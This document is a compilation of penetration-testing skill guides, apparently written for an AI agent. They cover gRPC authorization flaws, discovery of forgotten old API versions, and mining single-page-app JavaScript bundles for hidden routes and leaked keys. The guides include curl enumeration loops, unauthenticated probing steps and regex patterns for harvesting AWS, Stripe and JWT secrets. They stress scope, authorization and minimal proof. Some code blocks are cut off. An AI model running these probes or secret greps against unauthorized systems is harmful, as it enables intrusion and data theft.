| Admin method, no auth | Call privileged RPCs (`DeleteUser`, `GetConfig`) | Data manipulation / system access — Critical |
| Proxy forwards `x-user-id`/`x-tenant-id` unstripped | Spoof identity metadata → cross-tenant impersonation | Tenant isolation bypass — Critical |
| IDOR via enumerable id field | Iterate `user_id` over `GetUser` | Mass PII exfil — High |
| grpc-gateway / gRPC-Web route re-exposes internal RPC | Hit transcoded REST/JSON path unauth | Externally-reachable authz bypass — High/Critical |
| Plaintext h2c on internal port | MITM / sniff metadata (bearer tokens) | Credential capture — High |
| `.proto` leak (repo/swagger) | `-protoset` to drive reflection-off target | Unlocks Phases 3–4 — Low alone, High as enabler |

Related skills: **hunt-idor** (id enumeration logic), **hunt-api-misconfig** (JWT alg=none / mass-assignment in request messages), **hunt-auth-bypass** (edge-vs-backend trust boundary), **hunt-tls-network** (h2c/plaintext + ALPN), **cloud-iam-deep** (if a called RPC returns cloud creds).

---

## Validation — false-positive discipline

gRPC's failure modes look like successes to a naive `grep`. Apply these gates before any submission.

1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` mean auth WORKS — close the candidate. `Unimplemented (12)` means you have the wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.

2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, **info disclosure (Low/Medium at most)** — many vendors ship reflection on by design. Do NOT report it as "missing auth" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.

3. **Distinguish "no auth" from "auth not required for THIS method."** Some methods (health, public catalog reads) are legitimately anonymous. Prove the bug by showing an authenticated-vs-unauthenticated **state delta**: the same RPC returns another user's/tenant's private data without credentials, or a mutating admin RPC executes (re-read the changed state to confirm side-effect).

4. **Proxy-vs-backend reachability.** A bug reachable only by hitting an internal `:50051` you found via SSRF/port-scan is real but its severity depends on reachability. State explicitly how an external attacker reaches it (exposed port, SSRF egress, proxy passthrough). For metadata-spoofing, prove the PUBLIC proxy forwards the spoofed header — not just the bypassed backend port.

5. **OOB / Collaborator for anything blind.** If an RPC takes a URL/host argument (webhook, import, render), it is an SSRF candidate: point it at a Burp Collaborator payload with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF. No interaction = no SSRF. Hand off to **hunt-ssrf**.

6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark "slowdown." Either (a) version-match an unpatched HTTP/2 stack from the `server:` banner, or (b) demonstrate the reset-flood ONLY under explicit written authorization with an agreed window — then stop immediately. A slow response is not proof.

**Severity guide (after the gates above pass):**
- Sensitive/admin RPC callable with no auth, side-effect proven → **Critical**
- Proxy-forwarded metadata spoofing → cross-tenant impersonation → **Critical**
- IDOR / mass PII via enumerable RPC → **High**
- Internal service externally reachable (transcoder or open port) → **High**
- Plaintext h2c leaking bearer metadata → **High**
- Reflection enabled exposing non-public catalog → **Medium** (enabler)
- Proto/descriptor leak, no callable sensitive method → **Low**


### From `hunt-skills/hunt-shadow-api/SKILL.md`

## OWASP API9 — Improper Inventory Management (Shadow / Zombie APIs)

As an API evolves, old versions and internal/staging routes routinely stay reachable without
receiving the same security fixes as the current version — because nobody tracks that they
still exist. The bug is rarely in one endpoint; it's in the **delta** between what an old
version enforces and what the current version enforces on the same operation.

### When to use

Trigger when:
- Versioned paths are visible (`/v1/`, `/v2/`, `/api/2023-01-01/`) or `Accept`/`X-API-Version`
  headers are in play.
- A changelog, release notes, or deprecation notice references removed/old API behavior.
- A mobile APK/IPA (via `apk-redteam-pipeline` / `ios-redteam-pipeline`) hardcodes endpoints
  that look like an older backend version than the current web app calls.
- Multiple OpenAPI/Swagger specs are discoverable, or `info.version` in one spec implies others
  exist.

DO NOT use for single-version APIs with no version history — there's nothing to diff; go
straight to `hunt-api-misconfig` for direct exploitation of the one surface that exists.

---

# Path-based versioning
for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
done

# Header-based versioning
curl -s -H "X-API-Version: 1" https://$TARGET/api/users
curl -s -H "Accept: application/vnd.company.v1+json" https://$TARGET/api/users

# Subdomain-based versioning
for sub in api api-v1 api-v2 apiv1 apiv2 legacy-api old-api internal-api staging-api; do
  curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.$TARGET/"
done
```

A `200`/`401`/`403` on an old version path (anything but `404`/connection-refused) means the
version is still live and worth carrying into Stage 3, even if it demands auth.

---

## Stage 2 — Pull Every Reachable Spec, Not Just the Linked One

```bash
for path in openapi.json swagger.json v1/swagger.json v2/swagger.json v3/api-docs \
            api-docs.json swagger/v1/swagger.json .well-known/openapi.json; do
  curl -s -o /dev/null -w "%{http_code} /$path\n" "https://$TARGET/$path"
done

# Wayback Machine — a DEPRECATED version's spec often stays indexed after the live link is removed
curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*swagger*&output=json&collapse=urlkey"
curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*openapi*&output=json&collapse=urlkey"
```

When more than one spec resolves (a current one and an archived/old one), diff the endpoint
inventories directly:
```bash
jq -r '.paths | keys[]' v1-swagger.json | sort > /tmp/v1_paths.txt
jq -r '.paths | keys[]' v2-swagger.json | sort > /tmp/v2_paths.txt
comm -23 /tmp/v1_paths.txt /tmp/v2_paths.txt   # in v1 only — candidates for "still live but forgotten"
```
For every path in that diff, confirm it's still reachable against the v1 base URL. A route
documented only in the old spec that still returns something other than `404` is a zombie-
endpoint candidate — carry it into Stage 3.

---

## Stage 3 — Behavioral Diff Between Old and Current Version

For each operation that exists in **both** versions, compare security-relevant behavior, not
response shape. Response shape differences are Informational; behavioral security regressions
are the finding.

- **Auth strength.** Does the old version accept no token, an expired token, or a lower-
  privilege token that the current version rejects?
  ```bash
  curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://$TARGET/api/v1/users/me -w '\n%{http_code}\n'
  curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://$TARGET/api/v2/users/me -w '\n%{http_code}\n'
  ```
- **Rate limiting.** Burst the same number of requests against both versions' equivalent
  endpoint; a missing `429` on the old version means rate-limiting was added later and never
  backported.
- **Input validation.** Send the identical injection/oversized/malformed payload to both; the
  old version accepting what the new one rejects means hardening happened forward-only —
  chain into whichever injection class the payload targets (`hunt-sqli`, `hunt-idor`, etc.).
- **Field exposure.** Does the old version's response body include fields — internal IDs, other
  users' data, internal notes, PII — that the current version has since redacted?

---

## Stage 4 — Deprecated / Internal Routes Never Referenced by the Current UI

- Grep JS bundles for API calls no visible UI flow triggers (`/internal/`, `/admin/`, `/debug/`,
  `/_internal/`, `/test/`, `/staging/`) — reuse `hunt-source-leak`'s JS-bundle grep patterns for
  this specifically.
- Check `robots.txt` / `sitemap.xml` for disallowed API paths — a self-inflicted disclosure.
- Mobile-app endpoint inventories (via `apk-redteam-pipeline` / `ios-redteam-pipeline`) very
  often reference an older backend version than the current web app calls. Treat every
  APK/IPA-sourced endpoint as a version-diff candidate against the live web API.

---

## False-Positive Gate

- A version difference alone (different response shape, cosmetic field renaming) is
  Informational. The finding is a **security-relevant regression** — auth, rate-limit, or
  validation that got weaker going backward in version history.
- Confirm the old endpoint is not simply an alias/proxy to the current implementation before
  claiming a behavioral difference — send a payload that would actually behave differently
  under old vs. new logic, not just compare a version string in the response body.
- A `200` on a path that just serves a static "this API version is deprecated, use v2" message
  is not a finding — confirm the underlying operation still executes.

---

## Severity Table

| Finding | Severity |
|---|---|
| Old version bypasses auth entirely where current version requires it | Critical |
| Old version missing rate-limit present on current version | Medium–High (chain via `hunt-brute-force`) |
| Old version leaks extra fields (PII, internal IDs) vs. current | Medium–High |
| Old version accepts payloads the current version now validates/sanitizes | High (chain to the underlying injection class) |
| Version is reachable but behaviorally identical to current | Informational |

---

## Related Skills & Chains

- **`hunt-api-misconfig`** — owns exploitation once a spec or endpoint is in hand (mass
  assignment, JWT attacks, OData, Swagger-chain attacks). This skill hands it a sharper target:
  "here's a zombie endpoint with weaker validation than the current one."
- **`hunt-subdomain`** — owns host/subdomain-level discovery (`api-v1.target.com` as its own
  host, potential takeover). This skill owns what happens once you're inside a given host's
  version surface.
- **`hunt-source-leak`** — JS-bundle grep for internal/undocumented calls; reused here
  specifically for version-diffing rather than secret extraction.
- **`apk-redteam-pipeline`** / **`ios-redteam-pipeline`** — mobile builds routinely hardcode an
  older API version; every mobile-sourced endpoint is a version-diff candidate.
- **`hunt-brute-force`** — a rate-limit regression found here is only a complete finding once
  chained to actual brute-forceable impact (login, OTP, enumeration).


### From `hunt-skills/hunt-spa-api/SKILL.md`

## When to use this skill

Trigger when:
- A target host returns a tiny HTML shell + big `/static/js/*.js` or `/_next/static/*` bundles (React/Vue/Angular/Next/Svelte SPA)
- You see a subdomain named `console`, `app`, `dashboard`, `portal`, `admin`, `panel`, `manage`, `internal`
- Recon surfaces any `*api*`, `*-api*`, `api.*` host
- A login page is OAuth/SSO-gated (the *frontend* auth tells you nothing about whether the *API* enforces auth)

The core insight: **a SPA is a client to a backend API, and it ships the full map of that API — hosts, routes, sometimes keys — to anyone who views source.** The login page being protected says nothing about whether the API behind it checks tokens. Auth is frequently enforced on the *gateway/login* and missing on a *route group* of the API.

DO NOT skip this because "the app needs login" — that's exactly when this pays off.

---

### 1. Pull the shell + enumerate the bundles
```bash
curl -s https://console.target.com/ -o index.html

# generic:
grep -oiE 'src="[^"]+\.js[^"]*"' index.html
```
Download every bundle (they can be multi-MB — that's fine, it's all route data):
```bash
mkdir bundles
for j in $(grep -oE '/static/js/[^"]+\.js' index.html | sort -u); do
  curl -s "https://console.target.com$j" -o "bundles/$(echo "$j"|tr '/' '_')"
done
```

# Backend API hosts (incl. dev/beta/staging variants — often weaker auth)
grep -ohiE 'https://[a-z0-9.-]*(api|console|backend|service)[a-z0-9.-]*\.target\.com[a-z0-9/_-]*' $B | sort -u

# Grep for quoted "resource/action" strings:
grep -ohiE '"[a-z0-9_-]+/[a-z0-9_/-]+"' $B | tr -d '"' \
  | grep -iE '(login|user|account|order|billing|invoice|payment|deal|report|token|otp|password|reset|admin|profile|auth|upload|export|role|permission|dashboard|wallet|finance|sales)' | sort -u

# Secrets (validate before trusting — most AIza keys are Maps/analytics, not Auth)
grep -ohiE '(AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9A-Za-z]+|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|apiKey["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']+)' $B | sort -u
```
**Note:** minifiers store routes as concatenated string segments (e.g. `"account/payment/list"`), NOT full `/api/v2/...` URLs — so a naive `/api/v*` grep returns nothing. Grep for the **resource-word route strings** and prepend the base yourself.

**Lazy-loaded (async) chunks — don't stop at HTML-referenced bundles.** CRA/webpack SPAs reference only runtime+main+vendor in index.html; numbered async route chunks are named inside main.js's chunk map and loaded at runtime, so grepping only `/static/js/*.js` from the shell truncates route coverage to eager chunks.
```bash
grep -oE '[0-9]+:"[a-f0-9]+"' bundles/*main*.js        # {chunkId:"hash"} pairs

### 3. Establish a CONTROL — find an endpoint that IS gated
Before declaring anything vulnerable, send an unauthenticated request to an endpoint you expect to be protected, and capture what *correct* rejection looks like:
```bash
curl -s -X POST https://api.target.com/api/users -H 'Content-Type: application/json' -d '{}'

# secure → {"error":"Missing or invalid authorization header"} or HTTP 401
```
This is your differential. A sibling API (e.g. a second API host, or a different route group on the same host) is the ideal control — same stack, so a different response = real authz gap, not a quirk.

### 4. Test each route family UNAUTHENTICATED, both methods
For every discovered route, send it with **no `Authorization` header** and compare to the control:
```bash
for r in <routes>; do
  curl -s -o /tmp/r -w "[%{http_code}] $r\n" -X POST -H 'Content-Type: application/json' -d '{}' "https://api.target.com/api/v2/$r"
done
```
Interpret:
- **`401`/`"Missing authorization"`** → gated (correct). Move on.
- **`200` with data** → unauthenticated data exposure. **Finding.**
- **`400 "field X is mandatory"`** → the route processed your request and reached *business-logic validation* without an auth check → **auth bypass; supply the field minimally to confirm.**
- **`200` + verbose DB/stack error** (e.g. `PROCEDURE db_x.sp_y does not exist`) → reached the data layer unauthenticated; also a SQLi-surface signal.
- **Mandatory fields named like `is_admin` / `is_internal` / `requested_by` / `role_id` / `account_type`** → **authorization derived from client-supplied parameters** — set the privilege flag and you self-elevate. Critical-class.

### 5. Pivot & prove (minimally)
- IDs returned by one endpoint (`account_id`, `order_id`, `deal_id`) are the keys the *other* endpoints consume — they prove the whole router is reachable, not just one route.
- Test `dev-`/`beta-`/`staging-` API variants — they frequently have weaker/disabled auth.
- Check the response headers: `Access-Control-Allow-Origin: *` compounds the issue (any web origin reads it from a victim's browser).
- **STOP at minimum-necessary proof.** A handful of records (or a `totalCount`) confirms the missing check. Do NOT enumerate the table — see `redteam-mindset` data-minimization boundary. The finding is the absent auth, not the data volume.

---

## What "the API behind the SSO login" really means

A common, dangerous architecture:
- `console.target.com` (the SPA) → login is **Entra/Okta/Google OAuth** (looks airtight).
- `api.target.com` (the backend) → some route groups enforce the bearer token, **some route groups forgot the middleware.**

The frontend login is theatre if the API doesn't independently validate the token on every route. Always test the API directly, bare, regardless of how locked-down the login UI is.

---

## Anti-patterns

- **"The app requires login, so the API must be protected."** No — test the API directly, unauthenticated. The whole point.
- **"Minified bundle, can't read it."** You don't need to read it — grep it for hosts/routes/secrets. 5 minutes.
- **"`/api/v1/foo` returned 404, so no API here."** Wrong base or wrong method. Try `/api/`, `/api/v2/`, POST not GET, and the exact route strings from the bundle (Express's 404 echoes the path — use it to calibrate).
- **"AIza key found → critical secret."** Validate first — most are Maps/analytics keys (`CONFIGURATION_NOT_FOUND` on identitytoolkit = not Auth-enabled). Don't over-claim.
- **Dumping the whole dataset once you get a 200.** Stop at PoC. (`redteam-mindset`.)
- **Account-creation / write endpoints as "proof".** Read endpoints prove the auth gap without creating state. Never POST a `create`/`signup`/`upload` to "demonstrate" — that's a destructive write needing explicit per-action authorization.

---

## Related Skills & Chains

- **`hunt-api-misconfig`** — once the API is mapped, run the broader misconfig matrix (method tampering, mass assignment, JWT alg confusion) per route.
- **`hunt-idor`** — the `account_id`/`order_id` pivots feed straight into IDOR testing across discovered routes.
- **`hunt-source-leak`** — sourcemaps (`*.js.map`) reconstruct original source for deeper route/secret extraction; same harvesting muscle.
- **`hunt-nextjs`** — for Next.js targets, layer the middleware-bypass (`x-middleware-subrequest`) and `/_next/data` route tests on top of this.
- **`redteam-mindset`** — the data-minimization boundary governs step 5: prove the missing check, don't exfiltrate the table.
- **`recon-scope-triage`** — verify the API host actually belongs to the target before testing (don't pop a same-named third party's API).
